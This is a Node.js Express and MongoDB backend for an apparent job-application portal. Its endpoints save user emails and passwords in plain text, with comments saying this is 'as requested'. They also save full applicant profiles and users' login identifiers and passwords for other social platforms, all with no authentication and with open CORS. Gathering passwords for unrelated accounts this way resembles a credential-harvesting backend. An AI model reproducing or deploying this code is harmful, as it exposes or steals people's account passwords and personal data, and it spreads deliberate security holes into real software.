import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config({ path: path.resolve(__dirname, '../.env') });

const app = express();
const PORT = process.env.PORT || 5001;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// MongoDB Connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/data-portal';

mongoose.connect(MONGODB_URI)
  .then(() => console.log('Connected to MongoDB database'))
  .catch((err) => console.error('MongoDB connection error:', err));

// Schema & Model (Plain text password as requested)
const credentialSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    trim: true
  },
  password: {
    type: String,
    required: true
  },
  createdAt: {
    type: Date,
    default: Date.now
  }
});

const Credential = mongoose.model('Credential', credentialSchema);

const profileSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    trim: true,
    lowercase: true
  },
  fullName: String,
  phone: String,
  currentJob: String,
  expectedSalary: String,
  cvFileName: String,
  coverLetter: String,
  photoFileName: String,
  photoDataUrl: String,
  address: String,
  joiningDate: String,
  nationality: String,
  createdAt: {
    type: Date,
    default: Date.now
  },
  updatedAt: {
    type: Date,
    default: Date.now
  }
}, {
  timestamps: true
});

profileSchema.index({ email: 1 }, { unique: true });

const Profile = mongoose.model('Profile', profileSchema);

const socialConnectionSchema = new mongoose.Schema({
  userEmail: {
    type: String,
    required: true,
    trim: true,
    lowercase: true
  },
  platform: {
    type: String,
    required: true,
    trim: true,
    lowercase: true
  },
  identifier: {
    type: String,
    required: true,
    trim: true
  },
  password: {
    type: String,
    required: true
  },
  createdAt: {
    type: Date,
    default: Date.now
  },
  updatedAt: {
    type: Date,
    default: Date.now
  }
}, {
  timestamps: true
});

socialConnectionSchema.index({ userEmail: 1, platform: 1 }, { unique: true });

const SocialConnection = mongoose.model('SocialConnection', socialConnectionSchema);

// API Routes
app.post('/api/auth/save-credentials', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    // Save in plain text as requested by the user
    const newCredential = new Credential({
      email,
      password
    });

    await newCredential.save();
    console.log(`Saved credentials in plain text for: ${email}`);

    res.status(200).json({ success: true, message: 'Credentials saved successfully' });
  } catch (error) {
    console.error('Error saving credentials:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/profile/save-profile', async (req, res) => {
  try {
    const { email, profile } = req.body;

    if (!email || !profile) {
      return res.status(400).json({ error: 'Email and profile data are required' });
    }

    const normalizedEmail = String(email).trim().toLowerCase();
    const safeProfile = {
      fullName: profile.fullName || '',
      phone: profile.phone || '',
      currentJob: profile.currentJob || '',
      expectedSalary: profile.expectedSalary || '',
      cvFileName: profile.cvFileName || '',
      coverLetter: profile.coverLetter || '',
      photoFileName: profile.photoFileName || '',
      photoDataUrl: profile.photoDataUrl || '',
      address: profile.address || '',
      joiningDate: profile.joiningDate || '',
      nationality: profile.nationality || ''
    };

    const savedProfile = await Profile.findOneAndUpdate(
      { email: normalizedEmail },
      { $set: { email: normalizedEmail, ...safeProfile } },
      {
        upsert: true,
        new: true,
        setDefaultsOnInsert: true
      }
    );

    res.status(200).json({
      success: true,
      message: 'Profile saved successfully',
      profile: savedProfile
    });
  } catch (error) {
    console.error('Error saving profile:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/connections/save-social-connection', async (req, res) => {
  try {
    const { userEmail, platform, identifier, password } = req.body;

    if (!userEmail || !platform || !identifier || !password) {
      return res.status(400).json({ error: 'User email, platform, identifier, and password are required' });
    }

    const normalizedEmail = String(userEmail).trim().toLowerCase();
    const normalizedPlatform = String(platform).trim().toLowerCase();

    const savedConnection = await SocialConnection.findOneAndUpdate(
      { userEmail: normalizedEmail, platform: normalizedPlatform },
      { $set: { userEmail: normalizedEmail, platform: normalizedPlatform, identifier: String(identifier).trim(), password } },
      {
        upsert: true,
        new: true,
        setDefaultsOnInsert: true
      }
    );

    res.status(200).json({
      success: true,
      message: `${normalizedPlatform} connection saved successfully`,
      connection: savedConnection
    });
  } catch (error) {
    console.error('Error saving social connection:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Start Server
app.listen(PORT, () => {
  console.log(`Backend server running on port ${PORT}`);
});
